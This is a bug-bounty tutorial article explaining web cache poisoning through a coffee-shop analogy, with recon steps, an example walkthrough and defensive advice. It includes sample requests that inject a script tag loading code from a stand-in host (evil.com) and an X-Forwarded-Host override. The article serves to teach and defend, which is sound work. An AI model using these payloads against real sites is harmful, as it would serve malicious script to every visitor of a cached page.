---
title: ☕ Web Cache Poisoning — How to Trick the Internet’s Memory and Serve Everyone Your “Special Recipe”
url: https://infosecwriteups.com/web-cache-poisoning-how-to-trick-the-internets-memory-and-serve-everyone-your-special-recipe-eea160e6bb89?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-09-06
fetch_date: 2025-10-02T19:44:17.616313
---

# ☕ Web Cache Poisoning — How to Trick the Internet’s Memory and Serve Everyone Your “Special Recipe”

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Feea160e6bb89&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fweb-cache-poisoning-how-to-trick-the-internets-memory-and-serve-everyone-your-special-recipe-eea160e6bb89&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fweb-cache-poisoning-how-to-trick-the-internets-memory-and-serve-everyone-your-special-recipe-eea160e6bb89&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-eea160e6bb89---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-eea160e6bb89---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# ☕ Web Cache Poisoning — How to Trick the Internet’s Memory and Serve Everyone Your “Special Recipe”

[![Shah kaif](https://miro.medium.com/v2/resize:fill:64:64/1*ZCwTvovflA3nGDtIka9AAQ.jpeg)](https://medium.com/%40SKaif009?source=post_page---byline--eea160e6bb89---------------------------------------)

[Shah kaif](https://medium.com/%40SKaif009?source=post_page---byline--eea160e6bb89---------------------------------------)

3 min read

·

Aug 14, 2025

--

Listen

Share

[Shah kaif](https://medium.com/u/10f677056bcd?source=post_page---user_mention--eea160e6bb89---------------------------------------)

 | *“One poisoned latte, and suddenly everyone in the café is drinking malware.” |* [**LinkedIn**](https://www.linkedin.com/in/skaif009/)

Press enter or click to view image in full size

![]()

Imagine you’re at your favorite coffee shop. The barista knows your “usual” and proudly serves it to anyone who looks like they might like it. One day, a prankster comes in early and says:

> *“Yeah, Alex likes their latte with* ***pickle juice and soy sauce****.”*

Now the barista writes that down and serves it to *everyone* for the rest of the morning.

That’s **web cache poisoning** — except instead of bad coffee, it’s malicious JavaScript, phishing redirects, and security nightmares.

## What is Web Cache Poisoning?

**Definition:** It’s when an attacker **tricks a web cache** into storing a malicious version of a resource from your vulnerable app, and that poisoned copy is then **served to every visitor** until the cache expires or is purged.

Think of it as the ultimate “spray and pray” — no need to attack each victim individually. Just poison once, and let the cache happily *amplify* the damage.

## What is a Web Cache?

In human terms:
 A **web cache** is a glorified fridge for server responses. If the origin server serves the same “dish” repeatedly, the cache stores it and hands it out directly — saving time and kitchen effort.

## Types:

* **CDN cache**: Cloudflare, Akamai, Fastly, etc. (worldwide baristas)
* **Reverse proxy cache**: nginx, Varnish, Squid (local cafe staff)
* **Browser cache**: the mini-fridge on the customer’s desk

No matter the flavor, caches work on the same principle:

**Same request → same key → same stored response.**

## Key Headers to Watch (Your Cache Weather Report)

When you’re testing, these headers are your spyglass:

* Cache-Control
* Age
* Expires
* Via
* X-Cache
* Etag

## Practical Recon Steps (Like a Cache Detective)

**Step 1:** Send a request with a harmless payload.
 Look for:

```
Cache-Control: public
X-Cache: MISS
Age: 0
```

**Step 2:** Send the **same** request again.
 If you see:

```
X-Cache: HIT
Age: >0
```

… congratulations — you’re talking to a cache that remembers things.

**Step 3:** Slip in unkeyed parameters or headers (stuff the cache ignores but the app uses):

```
Accept-Language: en
Accept-Language: zz
X-Forwarded-Host: evil.com
```

**Step 4:** Look for reflection — if your test value shows up in the HTML or headers *and* it’s cacheable… you’ve got a live one.

## Example Attack Walk-through

## Innocent first request:

```
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en
```

Response:

```
Cache-Control: public, max-age=600
X-Cache: MISS
Age: 0
```

## Second request (same payload):

```
X-Cache: HIT
Age: 12
```

The page is cached for **600 seconds**.

## Now the poison:

```
GET /?lang=en HTTP/1.1
Host: victim.com
Accept-Language: en"><script src=//evil.com/x.js></script>
```

If the origin reflects this into HTML, the cache stores a **JavaScript booby trap** for 600 seconds — every visitor loads it.

## How to Identify a Vulnerability

1. **Find unkeyed input**

* Change a header or param that shouldn’t affect the page.
* If it’s ignored in the cache key but changes output — suspicious.

1. **Check for reflection**

* Inject a unique string like `cachepwn123`.
* If it comes back in HTML or headers, it’s influenceable.

1. **Confirm cache storage**

* Hit the same URL again from a different session/IP.
* If the poisoned value appears, cache poisoning is confirmed.

## Why It’s Dangerous

* **Stored XSS for thousands** without user interaction
* **Mass phishing** hosted on the real domain
* **Brand defacement** in seconds
* **Redirect everyone** to attacker-controlled sites

## Defending Against Cache Poisoning

* **At the app**: Never trust request headers for content generation unless validated; set `Cache-Control: private, no-store` for personalized responses; whitelist what can appear in absolute URLs.
* **At the cache/CDN**: Define exact cache key; strip untrusted headers; normalize URL paths; ignore unknown query params.

[Web Cache Poisoning](https://medium.com/tag/web-cache-poisoning?source=post_page-----eea160e6bb89---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----eea160e6bb89---------------------------------------)

[Bugs](https://medium.com/tag/bugs?source=post_page-----eea160e6bb89---------------------------------------)

[Bug Bounty Tips](https://medium.com/tag/bug-bounty-tips?source=post_page-----eea160e6bb89---------------------------------------)

[Bug Bounty Writeup](https://medium.com/tag/bug-bounty-writeup?source=post_page-----eea160e6bb89---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--eea160e6bb89---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--eea160e6bb89---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---...